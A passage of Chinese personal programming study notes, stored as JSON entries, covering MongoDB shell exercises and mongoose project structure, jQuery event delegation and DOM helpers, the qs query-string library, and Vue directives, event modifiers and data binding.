mongoose.model(\"comments\",commentsSchema)\n    comments.updateOne({id:commentId},{$push:{\"messages\":comment}}, function(err){\n        console.log(err)\n    })\n    comments.findOne({id:commentId},function(err, docs){\n        console.log(docs)\n    })\n    res.send({\n        \"status\":0,\n        \"message\":\"评论提交成功\"\n    })\n})\n```\n\n输出：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163631.png)\n\n## 练习\n```js\n//1.进入my_test数据库\nuse my_test\n\n//2.向数据库的user集合中插入一个文档  \ndb.users.insert({\n    username:\"sunwukong\"\n});\n\n//3.查询user集合中的文档\ndb.users.find();\n\n//4.向数据库的user集合中插入一个文档   \ndb.users.insert({\n    username:\"zhubajie\"\n});\n\n//5.查询数据库user集合中的文档\ndb.users.find();\n\n//6.统计数据库user集合中的文档数量\ndb.users.find().count();\n\n//7.查询数据库user集合中username为sunwukong的文档\ndb.users.find({username:\"sunwukong\"});\n\n//8.向数据库user集合中的username为sunwukong的文档，添加一个address属性，属性值为huaguoshan\ndb.users.update({username:\"sunwukong\"},{$set:{address:\"huaguoshan\"}});\n\n//9.使用{username:\"tangseng\"} 替换 username 为 zhubajie的文档\ndb.users.replaceOne({username:\"zhubajie\"},{username:\"tangseng\"});\n\n//10.删除username为sunwukong的文档的address属性\ndb.users.update({username:\"sunwukong\"},{$unset:{address:1}});\n\n//11.向username为sunwukong的文档中，添加一个hobby:{cities:[\"beijing\",\"shanghai\",\"shenzhen\"] , movies:[\"sanguo\",\"hero\"]}\n//MongoDB的文档的属性值也可以是一个文档，当一个文档的属性值是一个文档时，我们称这个文档叫做 内嵌文档\ndb.users.update({username:\"sunwukong\"},{$set:{hobby:{cities:[\"beijing\",\"shanghai\",\"shenzhen\"] , movies:[\"sanguo\",\"hero\"]}}});\ndb.users.find();\n\n//12.向username为tangseng的文档中，添加一个hobby:{movies:[\"A Chinese Odyssey\",\"King of comedy\"]}\ndb.users.update({username:\"tangseng\"},{$set:{hobby:{movies:[\"A Chinese Odyssey\",\"King of comedy\"]}}})\n\n//13.查询喜欢电影hero的文档\n//MongoDB支持直接通过内嵌文档的属性进行查询，如果要查询内嵌文档则可以通过.的形式来匹配\n//如果要通过内嵌文档来对文档进行查询，此时属性名必须使用引号 \ndb.users.find({'hobby.movies':\"hero\"});\n\n//14.向tangseng中添加一个新的电影Interstellar\n//$push 用于向数组中添加一个新的元素\n//$addToSet 向数组中添加一个新元素 ， 如果数组中已经存在了该元素，则不会添加\ndb.users.update({username:\"tangseng\"},{$push:{\"hobby.movies\":\"Interstellar\"}});\ndb.users.update({username:\"tangseng\"},{$addToSet:{\"hobby.movies\":\"Interstellar\"}});\ndb.users.find();\n\n//15.删除喜欢beijing的用户\ndb.users.remove({\"hobby.cities\":\"beijing\"});\n\n//16.删除user集合\ndb.users.remove({});\ndb.users.drop();\n\nshow dbs;\n\n//17.向numbers中插入20000条数据 7.2s\nfor(var i=1 ; i<=20000 ; i++){\n    db.numbers.insert({num:i});\n}\n\ndb.numbers.find()\n\ndb.numbers.remove({});\n\n//0.4s\nvar arr = [];\n\nfor(var i=1 ; i<=20000 ; i++){\n    arr.push({num:i});\n}\n\ndb.numbers.insert(arr);\n\n//18.查询numbers中num为500的文档\ndb.numbers.find({num:500})\n\n//19.查询numbers中num大于5000的文档\ndb.numbers.find({num:{$gt:500}});\ndb.numbers.find({num:{$eq:500}});\n\n//20.查询numbers中num小于30的文档\ndb.numbers.find({num:{$lt:30}});\n\n//21.查询numbers中num大于40小于50的文档\ndb.numbers.find({num:{$gt:40 , $lt:50}});\n\n//22.查询numbers中num大于19996的文档\ndb.numbers.find({num:{$gt:19996}});\n\n//23.查看numbers集合中的前10条数据\ndb.numbers.find({num:{$lte:10}});\n\n//limit()设置显示数据的上限\ndb.numbers.find().limit(10);\n//在开发时，我们绝对不会执行不带条件的查询\ndb.numbers.find();\n\n//24.查看numbers集合中的第11条到20条数据\n/*\n    分页 每页显示10条\n        1-10     0\n        11-20    10\n        21-30    20\n        。。。\n        skip((页码-1) * 每页显示的条数).limit(每页显示的条数);\n    skip()用于跳过指定数量的数据    \n    MongoDB会自动调整skip和limit的位置\n*/\ndb.numbers.find().skip(10).limit(10);\n\n//25.查看numbers集合中的第21条到30条数据\ndb.numbers.find().skip(20).limit(10);\n\ndb.numbers.find().limit(10).skip(10);\n\n//26.将dept和emp集合导入到数据库中\ndb.dept.find()\ndb.emp.find()\n\n//27.查询工资小于2000的员工\ndb.emp.find({sal:{$lt:2000}});\n\n//28.查询工资在1000-2000之间的员工\ndb.emp.find({sal:{$lt:2000 , $gt:1000}});\n\n//29.查询工资小于1000或大于2500的员工\ndb.emp.find({$or:[{sal:{$lt:1000}} , {sal:{$gt:2500}}]});\n\n//30.查询财务部的所有员工\n//(depno)\nvar depno = db.dept.findOne({dname:\"财务部\"}).deptno;\n// var depno = db.dept.find({dname:\"财务部\"}).deptno;这种将find代替findOne的方法\n//是不可行的，因为find()返回的是一个数组，不能直接访问文档的属性，而findONe()返回的是一个文档，\n//如果要用find(),则使用var depno = db.dept.find({dname:\"财务部\"})[0].deptno;\ndb.emp.find({depno:depno});\n\n\n//31.查询销售部的所有员工\nvar depno = db.dept.findOne({dname:\"销售部\"}).deptno;\ndb.emp.find({depno:depno});\n\n//32.查询所有mgr为7698的所有员工\ndb.emp.find({mgr:7698})\n\n//33.为所有薪资低于1000的员工增加工资400元\ndb.emp.updateMany({sal:{$lte:1000}} , {$inc:{sal:400}});\ndb.emp.find()\n\n```\n\n## 源码结构\n\n使用mongoose的时候，通常会在项目中创建三个文件：connect.js，mongoose-db.js，app.js。\n\n其中connect.js存放的是连接数据库的操作，我们只需要加载一次即可在程序运行期间一直连接数据库。\n\nmongoose-db.js文件存放模式和模型的生成的代码，没有连接信息，也没有其他额外不相干代码，可以在在mongoose-db.js中把模型exports公开：\n\n```js\nvar MyStudent = mongoose.model(\"Student\", Student_Schema);\nexports.MyStudent=MyStudent;\n\n/*定义其他模型和模式*/\nvar MyTeacher = mongoose.model(\"Teacher\", Teacher_Schema);\nexports.MyTeacher=MyTeacher;\n```\n\n然后在app.js中引用：\n\n```js\nvar MyStudent = require(\"./mongoose-db\").MyStudent;\nvar MyTeacher = require(\"./mongoose-db\").MyTeacher;\n```\n\napp.js存放对数据库的操作，比如CRUD。通过这样的方式，结构比较清晰，代码可读性大大增强。\n\n下面放源码（目的是给自己备份，笑脸...）\n\n> connect.js\n\n```js\nvar mongoose = require(\"mongoose\");\nmongoose.Promise = global.Promise;//为了解决过期的问题\n/*调试模式是mongoose提供的一个非常实用的功能，用于查看mongoose模块对mongodb操作的日志，一般开发时会打开此功能，以便更好的了解和优化对mongodb的操作。*/\nmongoose.set('debug', true);\n/*mongoose会缓存命令，只要connect成功，处于其前其后的命令都会被执行，connect命令也就无所谓放哪里*/\nvar db=mongoose.connect('mongodb://localhost/myDB');\n\ndb.connection.on(\"error\", function (error) {  \n  console.log(\"数据库连接失败：\" + error); \n});\n\ndb.connection.on(\"open\", function () {  \n  console.log(\"数据库连接成功\"); \n```\n\n> mongoose-db.js\n\n```js\nrequire('./connect');\nvar mongoose = require('mongoose');\nvar Schema = mongoose.Schema;\n/*定义模式Student_Schema*/\nvar Student_Schema = new Schema({\n  name: String,\n  id: Number,\n  phone: String,\n  date: Date\n\n}, {\n  versionKey: false\n});\n\n/*定义模型Student，数据库存的是students*/\nvar MyStudent = mongoose.model(\"Student\", Student_Schema);\nexports.MyStudent=MyStudent;\n\n/*mongoose.Schema({\n  username: {// 真实姓名\n    type: String,\n    required: true\n  },\n  password: { // 密码\n    type: String,\n    required: true\n  }\n});*/\n```\n\n> app.js\n"
  },
  {
    "title": "./notes/front-end/jquery.md",
    "body": "# JQuery给动态添加的元素绑定事件\n通常，jQuery 是这样给 HTML 元素绑定事件的：\n\n```js\n$('#clickMe').on('click', function () {\n    alert(\"hey it's Sam.\");\n  }\n);\n```\n\n事件绑定后，我们点击元素，浏览器就会弹一个对话框。\n但是，上述事件绑定只适用页面内已有的元素。jQuery on 文档里是这样说的：\n\nEvent handlers are bound only to the currently selected elements. They must exist at the time your code makes the call to .on()\n\n也就是说，如果上述 JavaScript 代码执行时，#clickMe 元素还不存在，是我们后期动态添加的话，则上述事件绑定不会生效 - jQuery 不能给不存在的 DOM 节点绑定事件处理器。\n\n但我们可以把它委托（delegated）给 document：\n\n```js\n$(document).on('click', '#clickMe', function(){\n  alert(\"hey it's Sam.\");\n});\n```\n\nHey document，如果有点击事件发生，请让 #clickMe 执行这个事情处理器。点击事件会冒泡，而 document 总是存在。这样，就达到我们希望的效果。同理，你也可以将事件绑定委托给某些已存在的父节点。\n\n# on()与bind()的差别\n\nJQuery从1.7+版本开始，提供了on()和off()，进行事件处理函数的绑定和取消。这2个API与JQuery最初提供的bind()和unbind()有很多相似的地方，也有一些不同之处。bind和unbind的详细介绍，可以参考这篇文章。\non()和bind()的函数签名如下：\n\n```js\nbind(type, [data], fn)\non(type,[selector],[data],fn)\n```\n\n可以看到2个函数的区别在于：是否支持selector这个参数值。由于javascript的事件冒泡特性，如果我们在父元素上注册了一个事件处理函数，当子元素上发生这个事件的时候，父元素上的事件处理函数也会被触发。如果使用on的时候，不设置selector，那么on与bind就没有区别了。\n\n```js\n<div id=\"parent\">\n  <input type=\"button\" value=\"a\" id=\"a\"/>\n  <input type=\"button\" value=\"b\" id=\"b\"/>\n</div>\n```\n\n上面这段代码，如果我们使用bind()在parent上绑定了click事件处理函数，当点击a或者b按钮的时候，都会执行事件处理函数。如果我们希望点击a的时候触发，点击b的时候不触发，那么可以使用on，代码如下：\n\n```js\n$(\"#parent\").on(\"click\",\"#a\",function(){\n  alert($(this).attr(\"id\"));\n});\n```\n\n可以看到：on()函数的参数selector就是为了在事件冒泡的时候，让父元素能够过滤掉子元素上发生的事件。如果使用了bind，那么就没有这个能力，子元素上发生的事件一定会触发父元素事件。\n还有一点需要注意：on绑定的事件处理函数，对于未来新增的元素一样可以，和delegate效果相同，而bind则不行。\n\n# Jquery与js常见使用总结\n\n## 获取子元素\n\nJS:\n\n```js\nvar test = document.getElementById(\"test\");\nvar a = test.getElementsByTagName(\"div\");\n\n// childNodes与children的区别：childNodes会把换行和空格也当成是节点信息\nvar b = test.childNodes;\nvar getFirstChild = test.children[0];\n\n\n// firstChild与firstElementChild的区别：fristChild会把换行和空格也当成是节点信息\nvar getFirstChild = test.firstChild;\nvar getFirstChild = test.firstElementChild;\n\n// lastChild与lastElementChild的区别：lastChild会把换行和空格也当成是节点信息\nvar getLastChildA = test.lastChild;\nvar getLastChildB = test.lastElementChild;\n```\n\nJquery:\n\n```js\n// children和find的区别：children只会查找直接子集，而find会跨越层级查找，一直找到没有为止\n$(\"#test\").children(); // 全部直接子节点\n$(\"#ul\").children(\"li\")\n$(\"#ul\").find(\"li\")\n```\n\n## 获取父节点\n\nJS:\n\n```js\nvar test = document.getElementById(\"test\");\nvar parent = test.parentNode; // 父节点\n```\n\nJquery:\n\n```js\n$(\"#test1\").parent(); // 父节点\n$(\"#test1\").parents(); // 全部父节点\n$(\"#test1\").parents(\".mui-content\");\n```\n\n## 获取兄弟节点\n\nJS:\n\n```js\nvar test = document.getElementById(\"test\");\nvar previous = test.previousSibling; // 上一个兄弟节点\nvar next = test.nextSibling; // 下一个兄弟节点\n```\n\nJquery:\n\n```js\n$(\"#test1\").prev();  // 上一个兄弟节点\n$(\"#test1\").prevAll(); // 之前所有兄弟节点\n$(\"#test1\").next(); // 下一个兄弟节点\n$(\"#test1\").nextAll(); // 之后所有兄弟节点\n$(\"#test1\").siblings(); // 所有兄弟节点\n$(\"#test1\").siblings(\"#test2\");\n```\n\n## 属性操纵\n\nJS:\n\n```js\nvar test = document.getElementById(\"test\");\ntest.classList.add(\"myclass\");\ntest.classList.add(\"myclass\", \"anotherClass\", \"thirdClass\")\ntest.classList.remove(\"myclass\")\ntest.classList.remove(\"myclass\", \"anotherClass\")\ntest.classList.toggle('myclass')\ntest.classList.contains('myCssClass')\n\ntest.getAttribute('align') // \"left\"\ntest.setAttribute('align', 'right');\nconsole.log(test.hasAttribute('align')) //true\ntest.removeAttribute('align');\n\n//data-*属性\nconsole.log(test.dataset.foo)\ntest.dataset.foo = \"baz\"\n```\n\nJquery:\n\n```js\n$(\"#test1\").addClass(\"intro\")\n$(\"#test1\").removeClass(\"intro\");\n$(\"#test1\").toggleClass(\"main\")\nconsole.log($(\"#test1\").hasClass(\"intro\")))\n\n$(\"#test1\").attr(\"width\")\n$(\"#test1\").attr(\"width\",\"180\")\n$(\"#test1\").attr({width:\"50\",height:\"80\"})\n$(\"#test1\").removeAttr(\"width\")\n```\n\n## 样式操作\n\nJS:\n\n```js\nvar test = document.getElementById(\"test\");\ntest.style.width = \"100px\";\ntest.style.getPropertyValue(\"width\");  \ntest.style.setProperty(\"width\", \"100px\", \"\");\ntest.style.removeProperty(\"width\")\ntest.setAttribute('style', 'width: 100px');\ntest.style.cssText = 'width: 100px';\n```\n\nJquery:\n\n```js\n$(\"#test\").css(\"width\");\n$(\"#test\").css(\"width\",\"100px\")\n$(\"#test\").css({\"color\":\"red\", \"background-color\":\"silver\", \"font-weight\":\"bold\"});\n```\n\n## 事件操作\n\nJS:\n\n```js\nvar test = document.getElementById(\"test\");\n\n//obj.on事件名 = 事件处理函数\ntest.onclick = function(){\n  alert('hi')\n};\n\ntest.addEventListener(\"click\", function(){\n    alert('hi')\n});\n\ntest.onclick = false\n\ntest.removeEventListener(\"click\", function(){\n    alert('hi')\n});\n```\n\nJquery:\n\n```js\n// 自 jQuery 版本 1.7 起，on() 方法是 bind()、live() 和 delegate() 方法的新的替代品\n$(\"#test\").on(\"click\", function(){\n    alert(\"The paragraph was clicked.\");\n});\n$(\"#test\").on('click', '#clickMe', function(){\n  alert(\"hey it's Sam.\");\n});\n\n$(\"#test\").bind(\"click\",function(){\n    alert(\"单击元素\");\n});\n\n// live方法在版本 1.9 中被移除。请使用on()方法代替\n$(\"#test\").live(\"click\",function(){\n    $(\"p\").slideToggle();\n});\n\n\n$(\"#test\").delegate(\"p\",\"click\",function(){\n  $(\"p\").css(\"background-color\",\"pink\");\n});\n\n$(\"p\").off(\"click\");\n```\n"
  },
  {
    "title": "./notes/front-end/qs.md",
    "body": "# qs简介\nqs是一个流行的查询参数序列化和解析库。可以将一个普通的object序列化成一个查询字符串，或者反过来将一个查询字符串解析成一个object,帮助我们查询字符串解析和序列化字符串。\n\n**安装**\n`npm install qs`\n`import qs from qs`\n\n# 数组解析和序列化\n数组序列化有几种方式：indices, brackets, repeat, comma，用来控制字符串的生成格式。来看下面的例子：\n```js\ns.stringify({ a: ['b', 'c'] }, { arrayFormat: 'indices' })\n// 'a[0]=b&a[1]=c'\nqs.stringify({ a: ['b', 'c'] }, { arrayFormat: 'brackets' })\n// 'a[]=b&a[]=c'\nqs.stringify({ a: ['b', 'c'] }, { arrayFormat: 'repeat' })\n// 'a=b&a=c'\nqs.stringify({ a: ['b', 'c'] }, { arrayFormat: 'comma' })\n// 'a=b,c'\n```\n上面的四种方式，序列化得到的结果越来越精简，但是当面对嵌套数组时，却会导致不同程度的信息丢失，而且丢失的越来越严重。以四种方式对`{ a: [['b'], 'c'] }`stringify 再 parse为例：\n```js\nqs.parse(qs.stringify({ a: [['b'], 'c'] }, { arrayFormat: 'indices' })) // { a: [['b'], 'c'] }\nqs.parse(qs.stringify({ a: [['b'], 'c'] }, { arrayFormat: 'brackets' })) // {a: [\"b\", \"c\"]}\nqs.parse(qs.stringify({ a: [['b'], 'c'] }, { arrayFormat: 'repeat' })) // {a: [\"b\", \"c\"]}\nqs.parse(qs.stringify({ a: [['b'], 'c'] }, { arrayFormat: 'comma' })) // {a: \"b,c\"}\n```\n所以当数据里有嵌套时最好使用indices模式，好在这也是默认模式。\n\n# ignoreQueryPrefix和addQueryPrefix\nignoreQueryPrefix这个参数可以自动帮我们过滤掉location.search前面的`?`，然后再解析，addQueryPrefix设为true可以在序列化的时候给我们加上?\n```js\n// 解析\nqs.parse('?x=1') // {?x: \"1\"}\nqs.parse('?x=1', {ignoreQueryPrefix: true}) //  {x: \"1\"}\n\n// 序列化\nqs.stringify({x: \"1\"}) //  x=1\nqs.parse({x: \"1\"}, {addQueryPrefix: true}) //  ?x=1\n```\n\n# delimiter\n```js\ndelimiter可以控制将哪种字符作为分隔符，由于cookie的格式是使用;来分隔，一个有用的例子是用来解析cookie：\n\ndocument.cookie // \"_ga=GA1.2.806176131.1570244607; _jsuid=1335121594; _gid=GA1.2.1453554609.1575990858\"\nqs.parse(document.cookie, {delimiter:'; '})\n```\n"
  },
  {
    "title": "./notes/front-end/vue.md",
    "body": "# Vue简介\n+ Vue.js 是目前最火的一个前端框架，React是最流行的一个前端框架（React除了开发网站，还可以开发手机App， Vue语法也是可以用于进行手机App开发的，需要借助于Weex）\n+ Vue.js 是前端的**主流框架之一**，和Angular.js、React.js 一起，并成为前端三大主流框架！\n+ Vue.js 是一套构建用户界面的框架，**只关注视图层**，它不仅易于上手，还便于与第三方库或既有项目整合。（Vue有配套的第三方类库，可以整合起来做大型项目的开发）\n+ 前端的主要工作？主要负责MVC中的V这一层；主要工作就是和界面打交道，来制作前端页面效果；\n## 为什么要学习流行框架\n + 企业为了提高开发效率：在企业中，时间就是效率，效率就是金钱；\n  - 企业中，使用框架，能够提高开发的效率；\n + 提高开发效率的发展历程：原生JS -> Jquery之类的类库 -> 前端模板引擎 -> Angular.js / Vue.js（能够帮助我们减少不必要的DOM操作；提高渲染效率；双向数据绑定的概念【通过框架提供的指令，我们前端程序员只需要关心数据的业务逻辑，不再关心DOM是如何渲染的了】）\n + 在Vue中，一个核心的概念，就是让用户不再操作DOM元素，解放了用户的双手，让程序员可以更多的时间去关注业务逻辑；\n + 增强自己就业时候的竞争力\n  - 人无我有，人有我优\n  - 你平时不忙的时候，都在干嘛？\n## 框架和库的区别\n + 框架：是一套完整的解决方案；对项目的侵入性较大，项目如果需要更换框架，则需要重新架构整个项目。\n  - node 中的 express；\n + 库（插件）：提供某一个小功能，对项目的侵入性较小，如果某个库无法完成某些需求，可以很容易切换到其它库实现需求。\n  - 1. 从Jquery 切换到 Zepto\n  - 2. 从 EJS 切换到 art-template\n## MVVM\nMVVM是前端视图层的概念，主要关注于 视图层分离，也就是说：MVVM把前端的视图层，分为了 三部分 Model, View , VM ViewModel\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n  <title>Document</title>\n  <!-- 1. 导入Vue的包 -->\n  <script src=\"./lib/vue-2.4.0.js\"></script>\n</head>\n<body>\n  <!-- 将来 new 的Vue实例，会控制这个 元素中的所有内容 -->\n  <!-- Vue 实例所控制的这个元素区域，就是我们的 V  -->\n  <div id=\"app\">\n    <p>{{ msg }}</p>\n  </div>\n  <script>\n    // 2. 创建一个Vue的实例， 得到 ViewModel\n    // 当我们导入包之后，在浏览器的内存中，就多了一个 Vue 构造函数\n    //  注意：我们 new 出来的这个 vm 对象，就是我们 MVVM中的 VM调度者\n    var vm = new Vue({\n      el: '#app',  // 表示，当前我们 new 的这个 Vue 实例，要控制页面上的哪个区域\n      // 这里的 data 就是 MVVM中的 M，专门用来保存 每个页面的数据的\n      data: { // data 属性中，存放的是 el 中要用到的数据\n        msg: '欢迎学习Vue' // 通过 Vue 提供的指令，很方便的就能把数据渲染到页面上，程序员不再手动操作DOM元素了【前端的Vue之类的框架，不提倡我们去手动操作DOM元素了】\n      }\n    })\n  </script>\n</body>\n</html>\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409113348.png)\n\n## 插值表达式、v-cloak、v-text、v-html\n问题：\n解决插值表达式时， 出现闪烁问题，即当vue.js未加载完成时，插值表达式不会替换， 而是等到vue.js加载完成时才会替换 如下：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191220174441.gif\"/>\n解决方法：\n1. 使用v-cloak, 当我们给一个标签添加v-cloak属性时， 在vue.js加载完成之后， vue.js会删除这个v-cloak属性， 所以我们可以使用如下方法来解决插值表达式闪烁问题\n```html\n<style>\n[v-cloak] {  /* 对含有v-cloak属性的标签进行样式修改*/\n  display: none; /*让其含有v-cloak属性的元素进行隐藏， 当vue.js加载完成后， v-cloak属性会消失， 从而又能显示*/\n}\n</style>\n<p v-cloak>++++++++ {{ msg }} ----------</p>\n```\n\n2. 使用v-text或v-html属性， 也可以解决插值表示闪烁问题\n```html\n<h4 v-text=\"msg\">==================</h4>\n<div v-html=\"msg2\">1212112</div> /*将msg2当作html来解析*/\n```\n但是v-text与v-html都会覆盖元素中原本的内容\n\n## v-bind\nv-bind: 是 Vue中，提供的用于绑定属性的指令\n1. 直接使用指令: `v-bind`\n2. 使用简化指令: `:`\n3. 在绑定的时候，拼接绑定内容：`:title=\"btnTitle + ', 这是追加的内容'\"`\n例子：\n```html\n<input type=\"button\" value=\"按钮\" v-bind:title=\"mytitle + '123'\"> /*即title属性中没有用单引号括起来的字符串都是vue中的data中的变量*/\n\n<script>\nvar vm = new Vue({\n  el: '#app',\n  data: {\n    mytitle: '这是一个自己定义的title'\n  }\n})\n</script>\n```\n\n## Vue指令之v-on和跑马灯效果\nv-on是用来绑定事件的， v-on的属性值只能是在vue中methods中自定的方法名\nv-on的缩写： `@`\n跑马灯效果\n1. HTML结构：\n```html\n<div id=\"app\">\n    <p>{{info}}</p>\n    <input type=\"button\" value=\"开启\" v-on:click=\"go\">\n    <input type=\"button\" value=\"停止\" v-on:click=\"stop\">\n</div>\n```\n2. Vue实例：\n```js\n// 创建 Vue 实例，得到 ViewModel\nvar vm = new Vue({\n  el: '#app',\n  data: {\n    info: '猥琐发育，别浪~！',\n\t//在data上定义定时器Id\n    intervalId: null\n  },\n  methods: {\n    go() {\n      // 如果当前有定时器在运行，则直接return\n      if (this.intervalId != null) {\n        return;\n      }\n      // 开始定时器\n      this.intervalId = setInterval(() => {//箭头函数，使得函数里面的this和函数外面的this保持一致\n        this.info = this.info.substring(1) + this.info.substring(0, 1);\n      }, 500);\n    },\n\t//注意：VM示例，会监听自己的data属性，如果某个属性发生变化，那么会自动的将这些数据同步到页面上去【好处：程序员只需要关系数据，而不需要考虑如何使用DOM来渲染页面】\n    stop() {\n      clearInterval(this.intervalId);\n      //每次清除定时器ID后，都需要将定时器Id置为null\n      this.intervalId = null;\n    }\n  }\n});\n```\n\n## 事件修饰符\n- .stop 阻止冒泡\n- .prevent 阻止默认事件\n- .capture 添加事件侦听器时使用事件捕获模式\n- .self 只当事件在该元素本身（比如不是子元素）触发时触发回调\n- .once 事件只触发一次\n.stop与self的区别： .self 只会阻止自己身上冒泡行为的触发，并不会真正阻止 冒泡的行为 \n\n用法:\n```html\n    <!-- 使用  .stop  阻止冒泡， 此时点击input时， 由于不会冒泡， 所以不会触发div的click事件 -->\n    <div class=\"inner\" @click=\"div1Handler\">\n      <input type=\"button\" value=\"戳他\" @click.stop=\"btnHandler\">\n    </div>\n\n    <!-- 使用 .prevent 阻止默认行为 -->\n    <a href=\"http://www.baidu.com\" @click.prevent=\"linkClick\">有问题，先去百度</a>\n\n    <!-- 使用  .capture 实现捕获触发事件的机制， 即点击input时， 先执行div的点击事件，在执行input的点击事件 -->\n    <div class=\"inner\" @click.capture=\"div1Handler\">\n      <input type=\"button\" value=\"戳他\" @click=\"btnHandler\">\n    </div>\n\n    <!-- 使用 .self 实现只有点击当前元素时候，才会触发事件处理函数 -->\n    <div class=\"inner\" @click=\"div1Handler\">\n      <input type=\"button\" value=\"戳他\" @click=\"btnHandler\">\n    </div>\n\n    <!-- 使用 .once 只触发一次事件处理函数 -->\n    <a href=\"http://www.baidu.com\" @click.prevent.once=\"linkClick\">有问题，先去百度</a>\n\n    <!-- 演示： .stop 和 .self 的区别 -->\n    <div class=\"outer\" @click=\"div2Handler\">\n      <div class=\"inner\" @click=\"div1Handler\">\n        <input type=\"button\" value=\"戳他\" @click.stop=\"btnHandler\">\n      </div>\n    </div>\n```\n\n## vm.$on\n- **参数**：\n  - `{string | Array<string>} event` (数组只在 2.2.0+ 中支持)\n  - `{Function} callback`\n- **用法**：\n  监听当前实例上的自定义事件。事件可以由`vm.$emit`触发。回调函数会接收所有传入事件触发函数的额外参数。\n- **示例**：\n```js\nvm.$on('test', function (msg) {\nconsole.log(msg)\n})\nvm.$emit('test', 'hi')\n// => \"hi\"\n```\n## vm.$once\n- **参数**：\n  - `{string} event`\n  - `{Function} callback`\n- **用法**：\n  监听一个自定义事件，但是只触发一次，在第一次触发之后移除监听器。\n## vm.$off\n- **参数**：\n  - `{string | Array<string>} event` (只在 2.2.2+ 支持数组)\n  - `{Function} [callback]`\n- **用法**：\n  移除自定义事件监听器。\n  - 如果没有提供参数，则移除所有的事件监听器；\n  - 如果只提供了事件，则移除该事件所有的监听器；\n  - 如果同时提供了事件与回调，则只移除这个回调的监听器。\n## vm.$emit\n- **参数**：\n  - `{string} eventName` ： 需要执行的方法名\n  - `[...args]` ： 执行的方法名中的参数\n触发当前实例上的事件。附加参数都会传给监听器回调。\n- **示例：**\n只配合一个事件名使用 `$emit`：\n```js\nVue.component('welcome-button', {\ntemplate: `\n  <button v-on:click=\"$emit('welcome')\">\n    Click me to be welcomed\n  </button>\n`\n})\n```\n```html\n<div id=\"emit-example-simple\">\n<welcome-button v-on:welcome=\"sayHi\"></welcome-button>\n</div>\n```\n```js\nnew Vue({\nel: '#emit-example-simple',\nmethods: {\n  sayHi: function () {\n    alert('Hi!')\n  }\n}\n})\n```\n配合额外的参数使用 `$emit`：\n```js\nVue.component('magic-eight-ball', {\ndata: function () {\n  return {\n    possibleAdvice: ['Yes', 'No', 'Maybe']\n  }\n},\nmethods: {\n  giveAdvice: function () {\n    var randomAdviceIndex = Math.floor(Math.random() * this.possibleAdvice.length)\n    this.$emit('give-advice', this.possibleAdvice[randomAdviceIndex])\n  }\n},\ntemplate: `\n  <button v-on:click=\"giveAdvice\">\n    Click me for advice\n  </button>\n`\n})\n```\n\n```html\n<div id=\"emit-example-argument\">\n<magic-eight-ball v-on:give-advice=\"showAdvice\"></magic-eight-ball>\n</div>\n```\n```js\nnew Vue({\nel: '#emit-example-argument',\nmethods: {\n  showAdvice: function (advice) {\n    alert(advice)\n  }\n}\n})\n```\n\n## $event\n有时也需要在内联语句处理器中访问原始的 DOM 事件。可以用特殊变量 $event 把它传入方法：\n```html\n<button v-on:click=\"warn('Form cannot be submitted yet.', $event)\">\n  Submit\n</button>\n```\n\n```js\n// ...\nmethods: {\n  warn: function (message, event) {\n    // 现在我们可以访问原生事件对象\n    if (event) {\n      event.preventDefault()\n    }\n    alert(message)\n  }\n}\n```\n\n## 事件绑定加括号与不加括号的区别\n```js\nmaxApp(e){\n  console.log(e);\n}\n```\n\n**不加括号时**\n```html\n<i @click=\"maxApp\"></i>\n```\n此时结果打印为：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409113405.png)\n\n\n**加括号时**\n```html\n<i @click=\"maxApp()\"></i>\n```\n此时打印undefined：\n\n如果想要打印MouseEvent，括号中必须传$event, 如下：\n```html\n<i @click=\"maxApp($event)\"></i>\n```\n\n**总结**： 加不加括号，其实就是是否默认传事件对象 event 。不加括号时，函数第一个参数为 event，加了括号后，需要手动传入`$event`才能获得事件对象。\n\n## '.native'修饰符的使用\n官网的解释：\n你可能想在某个组件的根元素上监听一个原生事件。可以使用`v-on`的修饰符`.native`。\n通俗点讲：就是在父组件中给子组件绑定一个原生的事件，就将子组件变成了普通的HTML标签，不加'. native'事件是无法触发的。\n```vue\n<template>\n  <div>\n    <my-component @click=\"outClick\"></my-component>\n  </div>\n</template>\n\n<script>\nimport Vue from 'vue'\nVue.component('my-component', {\n  template: `<el-button type=\"priamry\">InnerButton</el-button>`\n})\n\nexport default{\n  methods:{\n    outClick(){\n      alert(\"this is outer\");\n    }\n  }\n}\n</script>\n```\n此时点击页面中的按钮无任何反应。\n添加修饰符后：\n```vue\n<template>\n  <div>\n    <my-component @click.native=\"outClick\"></my-component>\n  </div>\n</template>\n```\n此时点击就会弹窗\n\n## v-model和双向数据绑定\n在vue中**只有**v-model这一个指令能实现双向数据绑定，即Model层数据变了，会导致View层数据也会跟着变。View层数据变了，也会导致Model层数据也会跟着变。 并且v-model**只能**用于表单元素中\n\n```html\n<body>\n  <div id=\"app\">\n    <h4>{{ msg }}</h4>\n    <!-- v-bind 只能实现数据的单向绑定，从M自动绑定到V，即model层数据变了，会导致View层数据会跟着变，但是View层数据变了，是不会导致Model层数据发生变化。 -->\n    <input type=\"text\" v-bind:value=\"msg\" style=\"width:100%;\">\n\n    <!-- 使用v-model指令，可以实现 表单元素和Model中数据的双向数据绑定 -->\n    <!-- 此时在网页上修改input中的值时，<h4>标签的内容也会发生变化 -->\n    <!-- 注意：v-model 只能运用在表单元素中 -->\n    <input type=\"text\" style=\"width:100%;\" v-model=\"msg\">\n  </div>\n  <script>\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        msg: '大家都是好学生，爱敲代码，爱学习，爱思考，简直是完美，没瑕疵！'\n      },\n      methods: {\n      }\n    });\n  </script>\n</body>\n```\n\n\n## 使用class样式\n1. 数组\n```html\n<h1 :class=\"['red', 'thin']\">这是一个邪恶的H1</h1>\n/*因为使用了v-bind绑定了class属性， 所以class属性值的内容除了单引号括起来的，其他的都要会当作变量， 所以这里用了数组变量*/\n```\n\n2. 数组中使用三元表达式\n```html\n<h1 :class=\"['red', 'thin', isactive?'active':'']\">这是一个邪恶的H1</h1>\n/*其中的isactive是你在vue的data中定义的变量， 